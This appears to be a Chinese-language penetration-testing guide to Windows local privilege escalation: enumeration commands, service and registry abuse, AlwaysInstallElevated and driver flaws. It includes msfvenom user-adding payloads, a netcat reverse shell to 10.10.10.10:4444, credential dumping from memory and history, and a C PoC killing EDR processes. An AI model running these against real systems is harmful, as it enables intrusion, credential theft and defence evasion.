# Windows 本地权限提升

{{#include ../../banners/hacktricks-training.md}}

### **查找 Windows 本地权限提升向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**如果你不知道什么是 Windows Access Tokens，请在继续之前阅读以下页面：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**有关 ACLs - DACLs/SACLs/ACEs 的更多信息，请查看以下页面：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**如果你不知道 Windows 中的完整性级别（Integrity Levels）是什么，应该在继续之前阅读以下页面：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows 安全控制

Windows 中存在多种机制可能会**阻止你枚举系统**、阻止你运行可执行文件，或甚至**检测到你的活动**。在开始权限提升枚举之前，你应该**阅读**以下**页面**并**枚举**所有这些**防御****机制**：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## 系统信息

### 版本信息枚举

检查该 Windows 版本是否存在已知漏洞（也检查已应用的补丁）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 版本 Exploits

这个 [site](https://msrc.microsoft.com/update-guide/vulnerability) 非常适合搜索有关 Microsoft 安全漏洞 的详细信息。这个数据库包含超过 4,700 个安全漏洞，显示了 Windows 环境所呈现的 **massive attack surface**。

**在系统上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas 内置了 watson)_

**在本地使用系统信息**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github 上的 exploits 仓库：**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 环境

是否有任何 credential/Juicy info 保存在 env variables 中？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 历史
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript 文件

你可以在 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) 学习如何启用此功能。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

记录了 PowerShell 管道执行的详细信息，包括已执行的命令、命令调用以及脚本的部分内容。然而，完整的执行细节和输出结果可能不会被全部捕获。

要启用此功能，请遵循文档中 "Transcript files" 部分的说明，选择 **"Module Logging"** 而不是 **"Powershell Transcription"**。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
要查看来自 PowersShell 日志的最后 15 条事件，您可以执行：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

会捕获脚本执行的完整活动和全部内容记录，确保每一段代码在运行时都被记录。该过程保留了每次活动的全面审计追踪，对于取证和分析恶意行为非常有价值。通过在执行时记录所有活动，可获得关于该过程的详细洞察。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block 的日志事件可以在 Windows Event Viewer 中的路径找到：**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
要查看最近 20 个事件，你可以使用：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 互联网设置
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 驱动器
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

如果更新不是通过 http**S** 而是通过 http 请求，你可以入侵该系统。

首先通过在 cmd 中运行以下命令来检查网络是否使用非 SSL 的 WSUS 更新：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
或者在 PowerShell 中运行以下命令：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
如果你收到如下任一回复：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

阅读该研究：
{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> 如果我们能够修改本地用户代理，并且 Windows Updates 使用 Internet Explorer 设置中配置的代理，则我们可以在本地运行 [PyWSUS](https://github.com/GoSecure/pywsus) 来拦截自己的流量，并以提升的用户身份在我们的资产上运行代码。
>
> 此外，由于 WSUS 服务使用当前用户的设置，它也会使用当前用户的证书存储。如果我们为 WSUS 主机名生成自签名证书并将其添加到当前用户的证书存储中，我们就能够拦截 HTTP 和 HTTPS 的 WSUS 流量。WSUS 不使用类似 HSTS 的机制来对证书实施首次信任（trust-on-first-use）类型的验证。如果提供的证书被用户信任且具有正确的主机名，服务将接受它。

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
如果你有一个 meterpreter 会话，你可以使用模块 **`exploit/windows/local/always_install_elevated`** 来自动化此技术

### PowerUP

使用 power-up 的 `Write-UserAddMSI` 命令在当前目录中创建一个 Windows MSI 二进制文件以提升权限。该脚本写出一个预编译的 MSI 安装程序，该安装程序会提示添加 user/group（因此你需要 GIU 访问）：
```
Write-UserAddMSI
```
只需执行已创建的二进制文件以提升权限。

### MSI 包装器

阅读本教程以了解如何使用这些工具创建 MSI 包装器。请注意，如果您**只是**想**执行**命令行，可以将 "**.bat**" 文件进行包装。

{{#ref}}
msi-wrapper.md
{{#endref}}

### 使用 WIX 创建 MSI

{{#ref}}
create-msi-with-wix.md
{{#endref}}

### 使用 Visual Studio 创建 MSI

- 使用 Cobalt Strike 或 Metasploit **生成** 一个 **新的 Windows EXE TCP payload** 到 `C:\privesc\beacon.exe`
- 打开 **Visual Studio**，选择 **Create a new project**，在搜索框中输入 "installer"。选择 **Setup Wizard** 项目并点击 **Next**。
- 为项目命名，例如 **AlwaysPrivesc**，将位置设置为 **`C:\privesc`**，选择 **place solution and project in the same directory**，然后点击 **Create**。
- 不断点击 **Next**，直到到达第 3 步（共 4 步）（选择要包含的文件）。点击 **Add** 并选择你刚生成的 Beacon payload。然后点击 **Finish**。
- 在 **Solution Explorer** 中选中 **AlwaysPrivesc** 项目，在 **Properties** 中将 **TargetPlatform** 从 **x86** 改为 **x64**。
- 你还可以更改其他属性，例如 **Author** 和 **Manufacturer**，以使安装的应用看起来更合法。
- 右键项目并选择 **View > Custom Actions**。
- 右键 **Install** 并选择 **Add Custom Action**。
- 双击 **Application Folder**，选择你的 **beacon.exe** 文件并点击 **OK**。这将确保 beacon payload 在安装程序运行时立即被执行。
- 在 **Custom Action Properties** 下，将 **Run64Bit** 改为 **True**。
- 最后，**构建**。
- 如果出现警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确保将平台设置为 x64。

### MSI 安装

要在后台执行恶意 `.msi` 文件的 **安装**：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
要利用此漏洞，你可以使用：_exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### 审计设置

这些设置决定了哪些内容会被**记录**，因此你应该注意。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding，了解日志被发送到何处很重要
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** 旨在管理本地 Administrator 密码，确保在加入域的计算机上每个密码都是唯一、随机且定期更新的。这些密码安全地存储在 Active Directory 中，只有通过 ACLs 被授予足够权限的用户才能访问，从而在被授权时查看 local admin 密码。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

如果启用，**明文密码会存储在 LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

从 **Windows 8.1** 起，Microsoft 为 Local Security Authority (LSA) 引入了增强保护，以 **阻止** 不受信任进程 **读取其内存** 或注入代码的尝试，进一步保护系统。\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** 在 **Windows 10** 中被引入。它的目的是保护存储在设备上的凭证免受诸如 pass-the-hash 攻击 的威胁。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**域凭据** 由 **本地安全授权机构 (Local Security Authority, LSA)** 验证，并被操作系统组件使用。当用户的登录数据由已注册的安全包验证时，通常会为该用户建立域凭据。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 用户与组

### 枚举用户与组

你应该检查你所属的任何组是否具有有趣的权限
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

如果你**属于某些特权组，可能能够提升权限**。在此了解特权组以及如何滥用它们以提升权限：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**了解更多** 有关 **token** 是什么的信息，请参见此页面: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
请查看下列页面以 **了解有趣的 tokens** 以及如何滥用它们：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 已登录用户 / 会话
```bash
qwinsta
klist sessions
```
### 主目录
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 密码策略
```bash
net accounts
```
### 获取剪贴板的内容
```bash
powershell -command "Get-Clipboard"
```
## 运行进程

### 文件和文件夹权限

首先，列出进程时，**检查进程命令行中是否包含密码**。\
检查你是否可以**覆盖正在运行的某个二进制文件**，或者你是否对该二进制目录具有写权限，以便利用可能的 [**DLL Hijacking attacks**](dll-hijacking/index.html)：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
始终检查是否有可能正在运行的 [**electron/cef/chromium debuggers**](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)，你可以滥用它来 escalate privileges。

**检查进程二进制文件的权限**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**检查进程二进制文件所在文件夹的权限 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

你可以使用 sysinternals 的 **procdump** 对正在运行的进程创建 memory dump。像 FTP 这样的服务会有 **credentials in clear text in memory**，尝试 dump the memory 并读取这些 credentials。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全的 GUI 应用

**以 SYSTEM 身份运行的应用可能允许用户启动 CMD 或浏览目录。**

示例: "Windows Help and Support" (Windows + F1)，搜索 "command prompt"，点击 "Click to open Command Prompt"

## 服务

列出服务：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 权限

你可以使用 **sc** 获取服务的信息
```bash
sc qc <service_name>
```
建议获取来自 _Sysinternals_ 的二进制 **accesschk** 来检查每个服务所需的权限级别。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
建议检查 "Authenticated Users" 是否可以修改任何 service:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 启用服务

如果遇到此错误（例如 SSDPSRV）：

_发生了系统错误 1058。_\
_该服务无法启动，可能是因为它被禁用，或者没有与其关联的已启用设备。_

你可以使用以下命令启用它：
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**考虑到服务 upnphost 依赖 SSDPSRV 才能工作 (for XP SP1)**

**另一个解决此问题的变通方法是运行：**
```
sc.exe config usosvc start= auto
```
### **修改服务二进制路径**

在 "Authenticated users" 组对某个服务拥有 **SERVICE_ALL_ACCESS** 的情况下，可以修改该服务的可执行二进制文件。要修改并执行 **sc**：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 重启服务
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges can be escalated through various permissions:

- **SERVICE_CHANGE_CONFIG**: 允许重新配置服务二进制文件。
- **WRITE_DAC**: 允许重新配置权限，从而能够更改服务配置。
- **WRITE_OWNER**: 允许获取所有权并重新配置权限。
- **GENERIC_WRITE**: 具有更改服务配置的能力。
- **GENERIC_ALL**: 同样具有更改服务配置的能力。

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### Services binaries weak permissions

**检查是否可以修改由服务执行的二进制文件** 或者是否对二进制文件所在的文件夹拥有 **写权限** ([**DLL Hijacking**](dll-hijacking/index.html))**。**\
你可以使用 **wmic** 获取每个由服务执行的二进制文件（不在 system32 中），并使用 **icacls** 检查你的权限：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
你也可以使用 **sc** 和 **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry modify permissions

你应该检查是否可以修改任何服务注册表。\
你可以通过以下方式**检查**你对某个服务**注册表**的**权限**：
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
应该检查 **Authenticated Users** 或 **NT AUTHORITY\INTERACTIVE** 是否拥有 `FullControl` 权限。如果是，服务执行的二进制可以被更改。

要更改服务执行二进制的 Path：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services 注册表 AppendData/AddSubdirectory 权限

如果你对某个注册表拥有此权限，这意味着**你可以从此注册表创建子注册表**。在 Windows 服务的情况下，这**足以执行任意代码：**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### 未加引号的服务路径

如果可执行文件的路径未被引号包围，Windows 会尝试执行空格之前的每一段路径。

例如，对于路径 _C:\Program Files\Some Folder\Service.exe_，Windows 会尝试执行：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
列出所有 unquoted service paths，排除那些属于内置 Windows services 的：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**你可以检测并 exploit** 这个漏洞，使用 metasploit: `exploit/windows/local/trusted\_service\_path` 你可以手动使用 metasploit 创建一个 service binary:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 恢复操作

Windows 允许用户指定在服务失败时要采取的操作。此功能可以配置为指向一个二进制文件。如果该二进制文件可被替换，可能会发生 privilege escalation。更多细节可在 [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) 中找到。

## 应用程序

### 已安装的应用程序

检查 **二进制文件的权限**（可能你可以覆盖其中一个并 escalate privileges）以及 **文件夹** 的权限（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 写权限

检查是否可以修改某些配置文件以读取某些特殊文件，或是否可以修改将由 Administrator 帐户执行的某个二进制文件（schedtasks）。

在系统中查找权限薄弱的文件夹/文件的一种方法是执行：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 启动时运行

**检查是否可以覆盖将由不同用户执行的某些 registry 或 binary。**\
**阅读** 下列页面以了解更多关于有趣的 **autoruns locations to escalate privileges**：


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

查找可能的 **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
如果一个驱动暴露任意内核读/写原语（在设计不良的 IOCTL 处理程序中常见），你可以通过直接从内核内存窃取 SYSTEM token 来提升权限。逐步技术见：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### 滥用设备对象上缺失的 FILE_DEVICE_SECURE_OPEN（LPE + EDR kill）

某些签名的第三方驱动通过 IoCreateDeviceSecure 使用强 SDDL 创建设备对象，但在 DeviceCharacteristics 中忘记设置 FILE_DEVICE_SECURE_OPEN。缺少此标志时，通过包含额外组件的路径打开设备时，secure DACL 不会被强制执行，从而允许任何非特权用户通过如下命名空间路径获取句柄：

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

一旦用户能够打开该设备，驱动暴露的特权 IOCTLs 可被滥用用于 LPE 和篡改。实战中观察到的示例能力包括：
- 返回对任意进程的完整访问句柄（token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser）。
- 不受限制的原始磁盘读/写（用于离线篡改、启动时持久化技巧）。
- 终止任意进程，包括 Protected Process/Light (PP/PPL)，允许通过内核从用户态终止 AV/EDR。

最小 PoC 模式（用户模式）：
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
针对开发者的缓解措施
- 在为需受 DACL 限制的设备创建设备对象时，始终设置 FILE_DEVICE_SECURE_OPEN。
- 对特权操作验证调用者上下文。在允许进程终止或返回句柄之前添加 PP/PPL 检查。
- 约束 IOCTLs（访问掩码、METHOD_*、输入验证），并考虑采用 brokered models 而非直接的内核权限。

给防御者的检测建议
- 监控用户态对可疑设备名（例如 \\ .\\amsdk*）的打开，以及表明滥用的特定 IOCTL 序列。
- 强制执行 Microsoft 的 vulnerable driver blocklist（HVCI/WDAC/Smart App Control），并维护自己的 allow/deny 列表。


## PATH DLL Hijacking

如果你对 **PATH 中某个文件夹拥有写权限**，你可能能够劫持进程加载的 DLL 并 **escalate privileges**。

检查 PATH 中所有文件夹的权限：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
有关如何滥用此检查的更多信息：

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## 网络

### 共享
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

检查 hosts file 中是否有其他已知计算机的硬编码条目
```
type C:\Windows\System32\drivers\etc\hosts
```
### 网络接口 & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 开放端口

检查是否可以从外部访问**受限服务**
```bash
netstat -ano #Opened ports?
```
### 路由表
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 表
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 防火墙规则

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(列出规则、创建规则、关闭、关闭...)**

更多[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

